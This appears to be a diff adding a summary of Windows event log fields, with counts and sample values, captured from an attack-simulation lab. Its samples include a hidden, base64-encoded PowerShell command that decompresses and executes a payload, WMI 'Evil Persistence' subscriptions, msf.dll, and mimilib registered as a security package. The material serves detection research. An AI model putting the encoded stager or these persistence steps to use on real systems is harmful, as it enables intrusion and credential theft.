3789-444691441-1275789787-519)(A;CIID;LC;;;RU)(A;CIID;CCLCSWRPWPLOCRSDRCWDWO;;;BA)(A;CIID;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-390003789-444691441-1275789787-3445)S:AI(AU;SA;WPWDWO;;;WD)(OU;CIIOIDSA;WP;f30e3bbe-9ff0-11d1-b603-0000f80367c1;bf967aa5-0de6-11d0-a285-00aa003049e2;WD)(OU;CIIOIDSA;WP;f30e3bbf-9ff0-11d1-b603-0000f80367c1;bf967aa5-0de6-11d0-a285-00aa003049e2;WD)(AU;CIIDSAFA;LCRPWPRCWDWO;;;DC)(AU;CIIDSAFA;LCRPWPRCWDWO;;;WD)
+
+param3 (seen 73 times)
+  Sample values:
+    - demand start
+    - disabled
+    - 01d8c3c4ae6a9e34
+    - 01d8c3c4908ad23e
+    - 01d8c3c48e4147c7
+
+FinalStatus (seen 73 times)
+  Sample values:
+    - 0x0
+
+DeviceVersionMajor (seen 73 times)
+  Sample values:
+    - 10
+    - 0
+
+DeviceVersionMinor (seen 73 times)
+  Sample values:
+    - 0
+
+DeviceNameLength (seen 73 times)
+  Sample values:
+    - 10
+    - 5
+    - 9
+    - 6
+    - 3
+
+DeviceName (seen 73 times)
+  Sample values:
+    - storqosflt
+    - luafv
+    - wcifs
+    - npsvctrig
+    - DfsDriver
+
+DeviceTime (seen 73 times)
+  Sample values:
+    - 2019-02-17T02:00:41.000000000Z
+    - 2021-01-07T22:49:16.000000000Z
+    - 2021-11-02T00:43:44.000000000Z
+    - 2016-07-16T02:28:33.000000000Z
+    - 2023-05-05T02:33:31.000000000Z
+
+ExtraInfoLength (seen 73 times)
+  Sample values:
+    - 203
+    - 201
+    - 183
+    - 184
+    - 197
+
+ExtraInfoString (seen 73 times)
+  Sample values:
+    - { "flags" : "0x00000010" , "registration_version" : "0x00000203" , "tx" : false , "sections" : false , "frame" : 0 , "class_name" : "FSFilter Quota Management" , "instances" : [["244000","0x00000000"]] }
+    - { "flags" : "0x00000014" , "registration_version" : "0x00000203" , "tx" : false , "sections" : false , "frame" : 0 , "class_name" : "FSFilter Virtualization" , "instances" : [["135000","0x00000000"]] }
+    - { "flags" : "0x00000014" , "registration_version" : "0x00000203" , "tx" : false , "sections" : false , "frame" : 0 , "class_name" : "FSFilter Virtualization" , "instances" : [["189900","0x00000000"]] }
+    - { "flags" : "0x00000018" , "registration_version" : "0x00000203" , "tx" : false , "sections" : false , "frame" : 0 , "class_name" : "(null)" , "instances" : [["46000","0x00000000"]] }
+    - { "flags" : "0x00000000" , "registration_version" : "0x00000203" , "tx" : false , "sections" : false , "frame" : 0 , "class_name" : "Filter" , "instances" : [["405000","0x00000001"]] }
+
+FilterID (seen 73 times)
+  Sample values:
+    - {02000000-000C-0000-6B03-F022905BDA01}
+    - {02000000-000B-0000-BF3E-EB22905BDA01}
+    - {02000000-000A-0000-DA52-DF22905BDA01}
+    - {02000000-000A-0000-FC41-5920905BDA01}
+    - {02000000-0009-0000-BEDF-5620905BDA01}
+
+CallerProcessId (seen 67 times)
+  Sample values:
+    - 0x1590
+    - 0x3c0
+    - 0x924
+    - 0x9d0
+    - 0x0
+
+CallerProcessName (seen 67 times)
+  Sample values:
+    - C:\Windows\ImmersiveControlPanel\telegram\telegram.exe
+    - C:\Windows\ImmersiveControlPanel\SystemSettings\telegram.exe
+    - C:\Windows\System32\WindowsPowerShell\v1.0\powershell\telegram.exe
+    - C:\Program Files\Git\usr\bin\bash\telegram.exe
+    - -
+
+Dummy (seen 65 times)
+  Sample values:
+    - -
+
+DisplayName (seen 65 times)
+  Sample values:
+    - -
+
+UserPrincipalName (seen 65 times)
+  Sample values:
+    - -
+
+HomeDirectory (seen 65 times)
+  Sample values:
+    - -
+
+HomePath (seen 65 times)
+  Sample values:
+    - -
+
+ScriptPath (seen 65 times)
+  Sample values:
+    - -
+
+ProfilePath (seen 65 times)
+  Sample values:
+    - -
+
+UserWorkstations (seen 65 times)
+  Sample values:
+    - -
+
+PasswordLastSet (seen 65 times)
+  Sample values:
+    - -
+    - 2/21/2024 6:02:22 PM
+    - 2/21/2024 6:02:21 PM
+    - 2/21/2024 6:02:16 PM
+    - 2/21/2024 6:02:15 PM
+
+AccountExpires (seen 65 times)
+  Sample values:
+    - -
+
+PrimaryGroupId (seen 65 times)
+  Sample values:
+    - -
+
+AllowedToDelegateTo (seen 65 times)
+  Sample values:
+    - -
+
+OldUacValue (seen 65 times)
+  Sample values:
+    - -
+
+NewUacValue (seen 65 times)
+  Sample values:
+    - -
+
+UserAccountControl (seen 65 times)
+  Sample values:
+    - -
+
+UserParameters (seen 65 times)
+  Sample values:
+    - -
+
+LogonHours (seen 65 times)
+  Sample values:
+    - -
+
+Device (seen 65 times)
+  Sample values:
+    - \Device\HarddiskVolume1
+    - \Device\Harddisk0\DR0
+
+param4 (seen 55 times)
+  Sample values:
+    - WSearch
+    - Spooler
+
+OldTargetUserName (seen 51 times)
+  Sample values:
+    - None
+    - System Managed Accounts Group
+    - Storage Replica Administrators
+    - Remote Management Users
+    - Access Control Assistance Operators
+
+NewTargetUserName (seen 51 times)
+  Sample values:
+    - None
+    - System Managed Accounts Group
+    - Storage Replica Administrators
+    - Remote Management Users
+    - Access Control Assistance Operators
+
+Session (seen 50 times)
+  Sample values:
+    - 2
+
+ClientInfo (seen 50 times)
+  Sample values:
+    - user: WIN-HOST-5\Administrator hostname: mj0b0drg
+    - user: ATTACKRANGE\Administrator hostname: C02D25J0MD6R
+    - user: ATTACKRANGE\administrator hostname: C02DN3AYMD6P
+    - user: ATTACKRANGE\administrator hostname: c02f35dfmd6r
+
+Type (seen 41 times)
+  Sample values:
+    - Image is replaced
+    - Image is locked for access
+    - Command Line
+    - Event Log
+
+AccountName (seen 34 times)
+  Sample values:
+    - tester$
+    - LocalSystem
+
+ImagePath (seen 33 times)
+  Sample values:
+    - c:\windows\temp\_yellow_po.exe ""
+    - c:\windows\temp\pTUNE-UP8.exe ""
+    - Ftp.exe
+    - cmd.exe
+    - C:\Temp\mockService.exe
+
+ServiceType (seen 33 times)
+  Sample values:
+    - user mode service
+    - kernel mode driver
+
+StartType (seen 33 times)
+  Sample values:
+    - demand start
+    - auto start
+
+Operation (seen 27 times)
+  Sample values:
+    - Created
+    - Deleted
+    - Modified
+
+Unused (seen 24 times)
+
+ID (seen 24 times)
+  Sample values:
+    - E6DB77E5-3DF2-4CF1-B95A-636979351E5B
+    - 9E6C4E1F-7D60-472F-BA1A-A39EF669E4B2
+    - D1E49AAC-8F56-4280-B9BA-993A6D77406C
+    - 3B576869-A4EC-4529-8536-B80A7769E899
+    - D4F940AB-401B-4EFC-AADC-AD5F3C50688A
+
+Detection Time (seen 24 times)
+  Sample values:
+    - 2023-11-26T23:43:08.709Z
+    - 2023-11-26T18:29:19.657Z
+    - 2023-11-22T23:17:17.044Z
+    - 2023-11-20T20:28:20.740Z
+    - 2023-11-20T20:28:20.710Z
+
+Process Name (seen 24 times)
+  Sample values:
+    - C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+    - C:\Windows\System32\lsass.exe
+    - C:\Windows\cmd.exe
+    - C:\Windows\PSEXESVC.exe
+    - C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE
+
+Security intelligence Version (seen 24 times)
+  Sample values:
+    - 1.401.1247.0
+    - 1.401.1219.0
+    - 1.401.1023.0
+    - 1.401.912.0
+    - 1.401.908.0
+
+Engine Version (seen 24 times)
+  Sample values:
+    - 1.1.23100.2009
+
+RuleType (seen 24 times)
+  Sample values:
+    - ENT\ConsR
+
+Target Commandline (seen 24 times)
+  Sample values:
+    - "C:\Users\research\Desktop\lsass_ASR_test.exe"
+    - "C:\Users\research\source\repos\asrtest\x64\Debug\asrtest.exe"
+    - \??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1
+    - "cmd"
+    - "C:\Windows\System32\cmd.exe"
+
+Parent Commandline (seen 24 times)
+  Sample values:
+    - C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+    - "cmd"
+    - C:\Windows\PSEXESVC.exe
+    - "C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE"
+    - "C:\Program Files\Microsoft Office\Root\Office16\EXCEL.EXE" "C:\Users\research\Desktop\macs\mac5.xls"
+
+Involved File (seen 24 times)
+  Sample values:
+    - C:\Users\research\Desktop\macs\mac5.xls
+    - C:\Users\research\Desktop\macs\mac7.xls
+    - C:\Users\research\Desktop\macs\mac8.xls
+    - C:\Users\research\Desktop\macs\mac6.xls
+
+Inhertiance Flags (seen 24 times)
+  Sample values:
+    - 0x00000000
+    - 0x00000001
+
+Name (seen 20 times)
+  Sample values:
+    - "AtomicRedTeam-WMIPersistence-Example"
+    - "Evil Persistence"
+    - "AtomicRedTeam-WMIPersistence-Example22"
+    - -
+    - "_LogWMIProcessCreationEvent_"
+
+TaskName (seen 19 times)
+  Sample values:
+    - \spawn
+    - \T1053_005_OnStartup
+    - \T1053_005_OnLogon
+    - \AtomicTask
+    - \T1053_005_WMI
+
+EventNamespace (seen 11 times)
+  Sample values:
+    - "root\\CimV2"
+    - "root/cimv2"
+    - "root/subscription"
+
+Query (seen 11 times)
+  Sample values:
+    - "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325"
+    - "select * from Win32_ProcessStartTrace where ProcessName='not-notepad.exe'"
+    - "select * from Win32_ProcessStartTrace where ProcessName='notepad.exe'"
+    - "SELECT * FROM MSFT_WmiProvider_ExecMethodAsyncEvent_Pre WHERE ObjectPath=\"Win32_Process\" AND MethodName=\"Create\""
+    - "SELECT * FROM __InstanceCreationEvent WITHIN 5 Where TargetInstance ISA \"__EventConsumer\""
+
+MemberName (seen 9 times)
+  Sample values:
+    - CN=MAURICE_ANDERSON,OU=Groups,OU=BDE,OU=Tier 1,DC=attackrange,DC=local
+    - -
+    - CN=JOHN_HESS,OU=Tier 2,DC=attackrange,DC=local
+    - cn=unrpiv,CN=Users,DC=attackrange,DC=local
+    - CN=unpriv2,CN=Users,DC=attackrange,DC=local
+
+MemberSid (seen 9 times)
+  Sample values:
+    - ATTACKRANGE\MAURICE_ANDERSON
+    - ATTACKRANGE\test
+    - ATTACKRANGE\Domain Admins
+    - ATTACKRANGE\JOHN_HESS
+    - AR-WIN-2\new_user_test
+
+Destination (seen 9 times)
+  Sample values:
+    - "C:\\Windows\\System32\\notepad.exe"
+    - "powershell -nop -w hidden -encodedcommand JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgALABbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACIASAA0AHMASQBBAEEAQQBBAEEAQQBBAEEALwA3AFYAWAA2ADMATwBpAFMAaABiAC8ASABQADgASwBQAHEAUgBLAHIAVABGAGUARgBaAE4ASgBaAGkAdABWAEEAeQBJAEsAUQBhAEwAaQBPAHoAZQBWAGEAcgBwAGIAZwB2AEkAUwBHAGcASAB2AHoAUAArACsAQgA5AFQAYwB6AEUANQBtAGQANgBwADIAMQB5AHIASwBmAHAAegBuADcAegB3ADQARwBKAFIAZABHAFMAeQAwAE0AUgB2ADQAaABIAEoAWABNAHgAcABHAHQAdQA5AHgAcgBWAEwAcABVAHYASQBWAHgAdAAxAHoAWAA4AHUAbABkAGUAeABoAGwAaAAvAG4AaQB4AGUATABzAHAAYwBnADkAUABFAEwASQBpAFMAawBVAGMAVAA5AFYAYgBvAFkAbwBoAEMANQBYAE8AVgB5AGoAOABJAFgAMQB5AGUAeABRADIAdABjAHMAYwBrAEoASwBZAGwARABXAHIAMgA0AEsARgAwAFUAUgA3AEUAWABvAFQAVgA5ADgAUgBDAHoAOQAvAFQARgBwAGUAegBWAEoAeABFAG8AcQBqAHcASgBRAFMARAA1AEwAcgBLADkANQB5ADkAZgBPAG4ARQBZAFUAbwA4AGQAOQAvAFUAZQBaAFUASQBVAFUAZABkADAAYgBCAHAAVgBxAHQAdwAzAGIAdgA1AEsAUQAzAHIAMQBhAEcANABvAFoAdAB4AGYAMwBPAFYATAB2AGUAZgA0AEoAbgBKAE8AWgBGAGsASAA0AFYAZAB3AFMAUABCAEkAZgBxAGYANQBHAE8AVQBlADEASQAzAEEAcwBWAG0AbAAvAE8AZQBmADUAZQByAFQAVgBmAE8ANQAzAHQAMwBGAHkASQBrAHEAWgBTAE8ATABHAEgAWAByAHgASABIAEsAVgBlADUANwBOAFYAYwA0AHkAUQBKAGEASwBRADkAcwBIAFAAcQBSAHYAMgBiADEAdQBlADMAeAByAGYAcQAwAHMARgA0AHYAagBCADgAYwBiAFMAOQBYAFQANQA1AFoAQQBRAEkALwBmAHUAMQBrAEwAdgBYAEkAVQB5AG4ARABjAGcAagBZAEMARQBjAE0AeQB6AFgAdQBLAGQAZgAzADkAUAB6AE0AZgBYADIAegBaAGgAeAA3AHoASABaAHAAWABmAEUAWQBEAGYAMwBBAG8ATwBIAGUAeABqAFMAcQA5ADUARgBIAEgARABxAG0AYQAyAEEAcgBSAHgAQQArAHoAeQBwAFgAdwBZAGkAUQBzAGoAagAwAHUATABNAHQAdwBMAGYAMwB0ADcAUgB5ADYAYwBXAE8AVQB3AE8ANQBUADcAOAByADkANwBtAGkAMAArAFEATQA3AHUAOAB5AFYAZAA0AHoAQQBkAFcAUQBoAGQAWABhAEsAUwBkACsAQgA0ADUAQgBrAFQAZABIAGMAZQBEAE8AVAA5AGEALwBTADYANABxAC8ASAA1AEsAcwBHAHIAcABlACsAbQBEAFYAQwBYAFUAbwBSAFoAaQA5AEkAVQBCAHYAdQA5AHkAdABYAFIAeAA4AFYAUQBzAEsAZgBoAFQARwBmAHEAUgBYAGYARABkAGMANAAwAGEATgB3AEEAagBFAFAAUABEAEwAQQAvAG4ASgBJAHgAcAA5AGYAbgB2ACsAQgB6AFYAbgBqAG0AagAyAGkAOABGAE4AYwA5AGMASgA1ADUAagBlAEkANQAyADMASABOAFAATQA5ADgAbQB6ADYAVwBMAGEAdQBtAFUAUABmAG4ANQBpAHgAbgBiAEQAcQBGAGgAZgB2AC8AcgBhAHAARABvADIAdgBhAG8AbABIAG4ASQB0AGYARQA1ADQAUwBzAGYAeABZAHkAdQBIAFYAcgBnAFUAVAArAFQANgBXAEIAbgBwAFgAeQA2AG8ARQBRADYAbwBWAFAATwBBAFgAMwA2AG0AYQAzAHIAMgB1AHkATgBWAHoAdwBhAEoAMgBDAEkAZQB3AFIAVwBRAFUAcABVAGYAegBUAG0ARwBNAE4ASwBXAGYARQBHADEAQQBYADgAagBuAHQASQAwADgAcwAxAGwAQgBrADkAVQA1ADkASwBLAHoAdAByAHoALwBkADUATABuAGMAYwBGAEUAVQAxAGIAaABoAEQAbgBlAE0AYQBaADEARABrAFUARgBMAGoAQgBDACsAeQBUADEAZABDAHoAUAB4AGkAVwBmADcAYgAzAEUASABzAE0AQgB1AGoAaQBKADMARgBQAFYAYwAvAGcAUABTAGsAdQB1AE4ANwBVAEQARQB4AGgAdQBnAEMARABCAE0AagBvAE4AaABHAFQAbwA1AEsAagBlAHYAYgBoAEkAcQBaAFkAVgB0AG4ARQA4AG8AZgBZAHQASgBCAGoAZwBNAGwAQgA1AEwAMgBFAEIATQA0AHkAYgBFAHcAVwBKADQAegBJAGEAbgA5AGEAMwA1AFUANgB3AFoAbABpAGgAcwA0ADEAQQBYAHEAbwBnAHYASgBEAHIASwBnADUANQB3AHEAcQBrAGcAMwBaAEYARgBTAC8AagBkAG0AbgArAHYAawBXAEIAUQA1AFYAbQBlAFEAMwBoAGsATgBDAFcAQQA0AFAAcQB0AHgATQB6AHQAawAwAE4AZgBLAHQAWgA4AFMANwA3ADgAegA3ADgAYwBXADgANABPAFoAbgBaAEMAZQBBAGwAawBwAEMAdgBGAEoAegBGAGgAZQBMAGcAVQBsAHoAbAA4AHUAOQAyADkAWQBGAHMAaQBGAEQARgBDAFQAUQA5ADgAVgBVAFUAUgB2ADIAawBiAFIAeABpAHAAbAAvAGoAYgBlAEsAZABsAGcATQA3AG8ASgBlADkAMgA5ADMATgAvADEAdQB4AE4ANAA5AHYARAB3AE8ANwBtAHIAYQBlAG8ANABFAE0AYwBhADcAcwBhAFAAdwAzADUARABYAFMAdQBqAFcANgBrAGQASgA3AEUAUwBUADgAUQBHAEwAegBlAEEANwByAEQAcgBkAGQAZgBLAC8AdABGAGYATgBtAE8AMwAzAFMAUwBCAHMAdABmAGgATABQAHEAOAA2ADAAZQBTAHMAcABlAEUAZgBtAHYAbgB5AHoAZQBXAGYAWABlAFMAYwArAFEAZgBtAFUAbgBUAFgAQwBqAHkAWgA3AE0AbgB0AC8AdQB6AFMATQA3AHAAKwA4AHAAZQBsAEgAZQBkAE8AeAAvAFcAZgB5AGoANwBqAHEAOABDADMAKwAxAE4ANABJAGsASgBhAGQATwB1AGUAawBNAFgARwBrADUANABkAGsAdQBSAGwAVwBZAFAAcwAwADkARwBvADkAbQBiAFoAYgBvADIANgB3AGEANgA0AFIASABOAGIASQA1AGsAVgBUACsAMABNAHYAQQBKAC8ARABMADQALwByAGgAQgA0AEQARgBTAHAAegBuADMASgAvAGcAdQAyAHYAVgB6AGYANgBtAG8ANwBiAEMAbgBxAGsAcABmAHoAWQB4AHIAeQAxAFkAeQBQAGMARQBOADEAdABpAEYAQgA0AGMAZgByAGcANwBaADcAaABiADQAOQBUAFoAZwBrAGgAcgBaAFkATgB5ACsASQBTAGwAZQB5AEEAbABlADYARgByAFcAWAArAG8AOQAwAEwARwBMADUAMQBhADcAcgAyAHQAKwBLAG0AeQBVAG0AMQBBAHkARABIAEkAdwBKAG0AbgBUAGEASwA2AGMAUABWAHIAZwBPAHkAOABwADkAQgBzAGsAVABjAGcAMABlAGwAUQBuAGIATQBrAFAAawBkAHYATwBNAHUALwBHAFUARABaAEsAcQB1AEcAQQB6AFIAYgBxAFQAWQBpAHkAVABxAEQAWgAxAEIAVABYAEwASgBlAHIAYQBpAHQATAB2AGUAdgBDAHUAcwB2AFMAaABtAEcATQBNAHcASgA2AG4AZgA1AEUAZQBnAEMAOQBYAG0AYwB3AEEAQgAvAFEAdABiAHoAYwBVAG4ANwA0AE0ATgBjAFAAbQBCAGMAMQBuAEkAVQBLACsARABGADgAdQBMAEYAQgA5AGkAMABiADgASABBAHUAeQBjAHEASQBUAEwAcwBiADIAVQAwADYATwBGAGwAdABsAHAANwBlAGwAdgBtADcAQQAxADEARQBjAHoAbABoAGgALwBYAEkAbgB5ADUANwB3AG8ATQBNAE0AVgBpADUAZwBiAFgAMAB1AG8AKwA0AFQAMgB4AHoAVABtAHcAOAB4ADQAOQBMAHQAOABrAGoAYgA3AGIARABpADEAVQBpAGUAYwBUAEYAZgBmAHkANABtAGcAZgA3AGwAYQBYADAAVQBmAEkAYQBkAG8AegBCADMAQgBUAFUAZwAyAGoAcgByAFcAbAAzAE4AWgBaAGMAdABUAHYAZQBOAGgAZQA5AGsAUgA1AFAAWgBPAGQAaAAwAHIAagByAFMATwBKAFMANwB5AFkARABiAGQAUgBOAEgANgBjAE4AZABXAEYAcwA1AGUASAA0ADEAWgBKAE0AVAA5AHkAdAByAEEARwBTAHgAbwBPAGwAdwBJADgAZgBKAGwATQB5AG0ATQBtAEMAWgBDADcAQQA3AEYASABEADYAQQBsADYAdwA5AGcAMgBaAG4ASgBxAFMAZgBOADAAdQBvAEEAOQBQADUAMABHAC8AVgB4ACsASQBSAFAATwBUAFYAZQBOAHUAeQBNAC8AZgBqAGoAYgA0AGUAbwAyADUAcQAzAEYAbQB0AGUAdgBhAGIAcABjAGQASABqADkAcgB2AE0ANgB0AHAAYQBDAFAAMQAxAFkAeABFAFcAdQBhAE8AUABSAGQAVQBKAGEASwBsAHUAMQAxAEgAUwBWAFgATgB2AG0AZwB1AHoASQBQAEUAaQBKAEoAegB5AFMAMQBpAG8AaAB5AGIAVwBEADMARAB0AFgAcwBFAGoAWQA2AFUAVwBxAGsAcQA0AGkAdwBSAHYAMABsAGkAMwAxAFEARQBYAHkAQgArAGEAZAB6AC8ASQByADEAagBEAGYAZQBKAEIANwBvAGcAWAB5AHEAZABoAGEANwBaAFkAOQBOAFoAVQA4AGsAUQBmAE0AdgBLAFUAbgBlADQAQQBGAEkANgAyAGcAaQBUAHkANQBoAFkAVgByAGYAZwBWADMAawBqAHYAYgBtAGEAMQBsAFIAMgB4AEYAQwBrAHEAMgAvACsAZQA0AEsAQgB2AGoANwBuAEYAdQBMAFMAQQBYAHQAOAA0AEcAOAB2AGcAQQBPAGEAMwBCAHMAMQBIADQAcwBVAGIAYgBKAEUAawBoAHgAeQBMAFYAegAyAHQAbABvACsAeQBEAEQARAArAEUAWABkAEsATgBOAGcATABzAGMAWAArAG0ARABjAHoANQBMAGkARwBIAFYAaABEAHIAaQAyAHQAawBiAFoAVwA0AEEAegBWAHUAOQB1AGcAbgBTAGQAdQB4AHoANQBqAHYAWAB2AGUAbQBVADEARQBiAGIAWgB0ADkAdwAzAEYANgAwAGwAVABzAHoAQgBwAE8AWgA3AEsAZAA5AGEAWQB5ADEAdgBPAFkASwA4AGQAYQB2AE0AOAA3ADIAdABvAFAAWQBVAFoASgA4AC8AZgArAFAAegBqADQAdgAzAEkAWQA5ADkAYQB6AG8ARgBOAEIARQA4AHoAUABQADMAMgBxADUAcgBQAEQAMgA4ADMAVABaAGYAcAA4AG4AdgBYAGUAOQBsAGQAbQBDAHQATAA0ADYANwB6AC8ARgBUAGQANwA5AEsANwByAC8AVwBxAEEARwBxAEEAdwBlAGsAVQBPAGQARQBNAFkAZwBzADYAdgBNAE4AawBQADUAZABNAG8ATQAvAFQAdABuAEsATgBTACsAWABqADYAMwB0AEwAUQBvAHcANQBNAHAAagBDADcAbgBoAHUALwA0AEQAZwArAHoAbwBlAHYAWAAwAHgAQgBNAEEAbwBlAEIANwBSAG4AZQBNAEYATgBZAGMAbQAzAFAAbAB4AFYAdQBUAGQAQwBtAEwAaQBPAFAAcABuAHgAZQBsADAATQBLAEMAYwBQAHoAMwBQAGEAbQBmAEQATABsAHgAVwA0AFYAMwBzAEgAbwBrAFkAOQBpADcAMwBXAHUARQBiAEsATgB4AHEATgAvAEwALwBkAHEASgBaACsASAA1AGEATwBIADIAUwBWAE4AMwBHADEAZgBFAEIANwBaADgAbAA3AFQAVQA2AGgAcQBYAHAAQwBQADQAdwA5AGwALwA0AFAAQQAvAEMARAAwAHYAOABNAGIAUQA1AGUATQBlAE8AOQBRAFYAYwBZADkARABGAGUAMQBWAEwANQBhADYAbQBrAHIATABsADMANQA1AEYAOQBnAEMAOABZAHUAdQBOAHUAaQA5AHkATABHAEEAcgBaADEAYwBZADMANABYAE8AbgBlAEgAOQBYAEwAbABHAFYAVQA3AG8ATAA3AGgASgB4ADMANwBrAHIAYwBFACsASQArAEIAWgA4ADgANABSAFcAbgBMAC8ATQB1AGUATQBuADMARABjAHUAUQBmAGEAUgA4AFIAcwAzAHAAcABqAEMAQwBIADYAbAArAGkAWgBrAEsAWQBXAFoATABCAGQAZABDAE0AbQBKADQAZQB5AGYAMABuADQAUwA5AGgATQBPAEEAQQBBAD0AIgApACkAOwBJAEUAWAAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAFMAdAByAGUAYQBtAFIAZQBhAGQAZQByACgATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAEcAegBpAHAAUwB0AHIAZQBhAG0AKAAkAHMALABbAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgBNAG8AZABlAF0AOgA6AEQAZQBjAG8AbQBwAHIAZQBzAHMAKQApACkALgBSAGUAYQBkAFQAbwBFAG4AZAAoACkAOwA="
+    - "WSH"
+
+TimeSource (seen 7 times)
+  Sample values:
+    - 169.254.169.123,0x9 (ntp.m|0x9|0.0.0.0:123->169.254.169.123:123)
+    - time.windows.com,0x8 (ntp.m|0x8|0.0.0.0:123->168.61.215.74:123)
+
+Consumer (seen 7 times)
+  Sample values:
+    - "\\\\.\\ROOT\\Subscription:CommandLineEventConsumer.Name=\"AtomicRedTeam-WMIPersistence-Example\""
+    - "CommandLineEventConsumer.Name=\"Evil Persistence\""
+    - "\\\\.\\ROOT\\subscription:CommandLineEventConsumer.Name=\"AtomicRedTeam-WMIPersistence-Example\""
+
+Filter (seen 7 times)
+  Sample values:
+    - "\\\\.\\ROOT\\Subscription:__EventFilter.Name=\"AtomicRedTeam-WMIPersistence-Example\""
+    - "__EventFilter.Name=\"Evil Persistence\""
+    - "\\\\.\\ROOT\\subscription:__EventFilter.Name=\"AtomicRedTeam-WMIPersistence-Example\""
+
+DomainPolicyChanged (seen 6 times)
+  Sample values:
+    - Lockout Policy
+
+DomainSid (seen 6 times)
+  Sample values:
+    - ATTACKRANGE\
+    - AR-WIN-2\
+
+MinPasswordAge (seen 6 times)
+  Sample values:
+    - -
+
+MaxPasswordAge (seen 6 times)
+  Sample values:
+    - -
+
+ForceLogoff (seen 6 times)
+  Sample values:
+    - -
+
+LockoutThreshold (seen 6 times)
+  Sample values:
+    - 1
+    - -
+    - 5
+
+LockoutObservationWindow (seen 6 times)
+  Sample values:
+    - -
+    - Ĝ
+    - ě
+
+LockoutDuration (seen 6 times)
+  Sample values:
+    - -
+
+PasswordProperties (seen 6 times)
+  Sample values:
+    - -
+
+MinPasswordLength (seen 6 times)
+  Sample values:
+    - -
+    - Ĝ
+    - ě
+
+PasswordHistoryLength (seen 6 times)
+  Sample values:
+    - -
+
+MachineAccountQuota (seen 6 times)
+  Sample values:
+    - -
+
+MixedDomainMode (seen 6 times)
+  Sample values:
+    - -
+
+DomainBehaviorVersion (seen 6 times)
+  Sample values:
+    - -
+
+OemInformation (seen 6 times)
+  Sample values:
+    - -
+
+UserContext (seen 6 times)
+  Sample values:
+    - S-1-5-18
+    - ATTACKRANGE\administrator
+    - ATTACKRANGE\Administrator
+
+NewName (seen 5 times)
+  Sample values:
+    - HKLM\System\CurrentControlSet\Control\SafeBoot\Minimal\AtomicSafeBoot
+    - HKLM\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore
+    - HKLM\System\CurrentControlSet\Control\Print\Environments\Windows x64\Print Processors\PrintFiiterPipelineSvc
+    - HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components\{052860C8-3E53-3D0B-9332-48A8B4971353}
+    - HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\TelemetryController\SneakyPersistence
+
+ModuleDll (seen 4 times)
+  Sample values:
+    - c:\temp\msf.dll
+
+ProcessorArchitecture (seen 4 times)
+  Sample values:
+    - AMD64
+
+AccessMask (seen 4 times)
+  Sample values:
+    - 16777216
+
+TreeDelete (seen 3 times)
+  Sample values:
+    - %%14679
+
+InstanceId (seen 3 times)
+  Sample values:
+    - {00000000-0000-0000-0000-000000000000}
+    - {7AD1452B-31A1-4664-BAD4-57539A029944}
+
+ActionName (seen 3 times)
+  Sample values:
+    - C:\Windows\System32\notepad.exe
+    - notepad.exe
+
+TaskInstanceId (seen 3 times)
+  Sample values:
+    - {7AD1452B-31A1-4664-BAD4-57539A029944}
+    - {2EE32989-FAF3-4BA3-9FB9-DB0080598F68}
+
+EnginePID (seen 3 times)
+  Sample values:
+    - 4368
+    - 536
+    - 537
+
+BackupType (seen 2 times)
+  Sample values:
+    - 1
+
+ClientProcessId (seen 2 times)
+  Sample values:
+    - 3524
+    - 4628
+
+ClientProcessStartKey (seen 2 times)
+  Sample values:
+    - 232779805739724529
+    - 232779805739724525
+
+TimeSourceRefId (seen 2 times)
+  Sample values:
+    - 1255620008
+
+CurrentStratumNumber (seen 2 times)
+  Sample values:
+    - 4
+
+ManualPeer (seen 2 times)
+  Sample values:
+    - time.windows.com,0x8
+
+ObjectValueName (seen 2 times)
+  Sample values:
+    - DSRMAdminLogonBehavior
+    - Security Packages
+
+OldValueType (seen 2 times)
+  Sample values:
+    - -
+    - %%1879
+
+OldValue (seen 2 times)
+  Sample values:
+    - -
+    - ""
+
+NewValueType (seen 2 times)
+  Sample values:
+    - %%1876
+    - %%1879
+
+NewValue (seen 2 times)
+  Sample values:
+    - 2
+    - mimilib
+
+ProcessID (seen 1 times)
+  Sample values:
+    - 4368
+
+Priority (seen 1 times)
+  Sample values:
+    - 16384
+
+SupportInfo1 (seen 1 times)
+  Sample values:
+    - 1
+
+SupportInfo2 (seen 1 times)
+  Sample values:
+    - 4213
+
+ProcessingMode (seen 1 times)
+  Sample values:
+    - 0
+
+ProcessingTimeInMilliseconds (seen 1 times)
+  Sample values:
+    - 953
+
+DCName (seen 1 times)
+  Sample values:
+    - \\ar-win-dc.attackrange.local
+
+NumberOfGroupPolicyObjects (seen 1 times)
+  Sample values:
+    - 2
